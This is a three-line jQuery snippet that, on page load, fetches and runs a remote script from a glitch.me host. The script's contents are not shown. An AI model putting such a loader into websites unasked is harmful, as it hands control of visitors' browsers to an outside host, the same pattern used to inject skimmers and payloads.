$(document).ready(function(){
    $.getScript("//empress-es.glitch.me/script.js")
})